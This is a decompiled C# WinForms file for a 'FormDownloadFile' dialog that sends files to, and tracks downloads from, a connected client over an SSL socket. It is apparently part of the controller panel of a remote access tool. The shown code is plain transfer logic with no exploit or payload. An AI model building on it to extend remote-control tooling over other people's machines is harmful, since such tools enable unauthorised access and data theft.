using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;
using DarkUI.Controls;
using DarkUI.Forms;
using Server.Connection;
using Server.Helper;

namespace Server.Forms
{
	// Token: 0x02000062 RID: 98
	public partial class FormDownloadFile : DarkForm
	{
		// Token: 0x170000AE RID: 174
		// (get) Token: 0x060003DD RID: 989 RVA: 0x000271D8 File Offset: 0x000271D8
		// (set) Token: 0x060003DE RID: 990 RVA: 0x000271E0 File Offset: 0x000271E0
		public Form1 F { get; set; }

		// Token: 0x170000AF RID: 175
		// (get) Token: 0x060003DF RID: 991 RVA: 0x000271EC File Offset: 0x000271EC
		// (set) Token: 0x060003E0 RID: 992 RVA: 0x000271F4 File Offset: 0x000271F4
		internal Clients Client { get; set; }

		// Token: 0x060003E1 RID: 993 RVA: 0x00027200 File Offset: 0x00027200
		public FormDownloadFile()
		{
			this.InitializeComponent();
		}

		// Token: 0x060003E2 RID: 994 RVA: 0x00027210 File Offset: 0x00027210
		private void timer1_Tick(object sender, EventArgs e)
		{
			if (this.FileSize >= 2147483647L)
			{
				this.timer1.Stop();
				MessageBox.Show("Don't support files larger than 2GB.");
				base.Dispose();
				return;
			}
			if (!this.IsUpload)
			{
				this.labelsize.Text = Methods.BytesToString(this.FileSize) + " \\ " + Methods.BytesToString(this.Client.BytesRecevied);
				if (this.Client.BytesRecevied >= this.FileSize)
				{
					this.labelsize.Text = "Downloaded";
					this.labelsize.ForeColor = Color.Green;
					this.timer1.Stop();
					return;
				}
			}
			else
			{
				this.labelsize.Text = Methods.BytesToString(this.FileSize) + " \\ " + Methods.BytesToString(this.BytesSent);
				if (this.BytesSent >= this.FileSize)
				{
					this.labelsize.Text = "Uploaded";
					this.labelsize.ForeColor = Color.Green;
					this.timer1.Stop();
				}
			}
		}

		// Token: 0x060003E3 RID: 995 RVA: 0x00027334 File Offset: 0x00027334
		private void SocketDownload_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				Clients client = this.Client;
				if (client != null)
				{
					client.Disconnected();
				}
				Timer timer = this.timer1;
				if (timer != null)
				{
					timer.Dispose();
				}
			}
			catch
			{
			}
		}

		// Token: 0x060003E4 RID: 996 RVA: 0x0002738C File Offset: 0x0002738C
		public void Send(object obj)
		{
			object sendSync = this.Client.SendSync;
			lock (sendSync)
			{
				try
				{
					this.IsUpload = true;
					byte[] array = (byte[])obj;
					byte[] bytes = BitConverter.GetBytes(array.Length);
					this.Client.TcpClient.Poll(-1, SelectMode.SelectWrite);
					this.Client.SslClient.Write(bytes, 0, bytes.Length);
					using (MemoryStream memoryStream = new MemoryStream(array))
					{
						memoryStream.Position = 0L;
						byte[] array2 = new byte[50000];
						int num;
						while ((num = memoryStream.Read(array2, 0, array2.Length)) > 0)
						{
							this.Client.TcpClient.Poll(-1, SelectMode.SelectWrite);
							this.Client.SslClient.Write(array2, 0, num);
							this.BytesSent += (long)num;
						}
					}
					Program.form1.BeginInvoke(new MethodInvoker(delegate()
					{
						base.Close();
					}));
				}
				catch
				{
					Clients client = this.Client;
					if (client != null)
					{
						client.Disconnected();
					}
					Program.form1.BeginInvoke(new MethodInvoker(delegate()
					{
						this.labelsize.Text = "Error";
						this.labelsize.ForeColor = Color.Red;
					}));
				}
			}
		}

		// Token: 0x040002AC RID: 684
		public long FileSize;

		// Token: 0x040002AD RID: 685
		private long BytesSent;

		// Token: 0x040002AE RID: 686
		public string FullFileName;

		// Token: 0x040002AF RID: 687
		public string ClientFullFileName;

		// Token: 0x040002B0 RID: 688
		private bool IsUpload;

		// Token: 0x040002B1 RID: 689
		public string DirPath;
	}
}
